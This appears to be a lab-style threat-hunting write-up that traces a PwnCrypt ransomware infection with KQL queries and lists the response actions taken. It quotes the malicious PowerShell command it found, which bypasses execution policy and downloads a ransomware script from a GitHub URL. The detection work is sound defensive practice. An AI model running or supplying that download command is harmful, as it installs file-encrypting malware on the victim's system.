## üóìÔ∏è Timeline Summary and Findings

### üîç Scenario

A new ransomware strain named **PwnCrypt** has been reported in the wild. It uses a **PowerShell-based payload** to encrypt files on infected systems using **AES-256** encryption. The ransomware targets directories such as `C:\Users\Public\Desktop` and appends a `.pwncrypt` extension to filenames (e.g., `hello.txt` ‚Üí `hello.pwncrypt.txt`).

Due to the organization's **immature security program**, including lack of user awareness training, the CISO has requested an internal investigation to identify and respond to any potential infections.

## üßæ Detection Process

### 1Ô∏è‚É£ File Discovery Using KQL
Initial hunting focused on file artifacts with the `.pwncrypt` pattern:

```kql
let VMname = "windows-target-1";
DeviceFileEvents
| where DeviceName == VMname
| where FolderPath contains "pwncrypt"
| order by Timestamp desc
| project Timestamp, DeviceName, FolderPath, ActionType, InitiatingProcessCommandLine
````

**Findings:**

* Encrypted files with `.pwncrypt` extensions were found.
* Affected directories include **Desktop** and **Temp** folders.
* Strong indication that `windows-target-1` was infected.

---

### 2Ô∏è‚É£ Process Tracing and Payload Delivery

Correlated events around the time of file encryption revealed suspicious use of PowerShell:

```kql
let VMname = "windows-target-1";
let specificTime = datetime(2025-06-10T16:13:46.9449819Z);
DeviceProcessEvents
| where DeviceName == VMname
| where Timestamp between ((specificTime - 2m) .. (specificTime + 2m))
| where ProcessCommandLine contains "pwncrypt"
| order by Timestamp desc
| project Timestamp, DeviceName, ActionType, FileName, ProcessCommandLine
```

**Malicious Command Identified:**

```powershell
cmd.exe /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1
```

**Indicators:**

* Use of **`-ExecutionPolicy Bypass`** to disable script restrictions.
* Download of malicious payload from **GitHub**.
* Output written to `C:\programdata\pwncrypt.ps1`.

---

## üßØ Response Actions

* ‚úÖ **Isolated** the infected device `windows-target-1`.
* üîÅ Created a **detection rule** for `.pwncrypt` activity across all devices.
* ‚úÖ **Isolated additional infected devices** discovered via the new rule.
* üì¢ **Reported findings to the CISO** with all collected evidence.
* üóÇÔ∏è **Documented all encrypted files** and tracked impacted endpoints.
* ‚ö†Ô∏è Due to limited internal capacity, external assistance was requested for forensic analysis and recovery efforts.

## üîß Recommendations and Improvements

Given the organization‚Äôs current security maturity:

1. üßë‚Äçüè´ **Launch employee awareness training** to reduce user-driven infection vectors.
2. üõ†Ô∏è **Harden systems** and restrict PowerShell execution on standard endpoints.
3. üìà **Expand detection coverage** using known malware/ransomware signatures.
4. üîÑ Use this incident to **prioritize long-term investment** in endpoint protection, EDR solutions, and IR procedures.
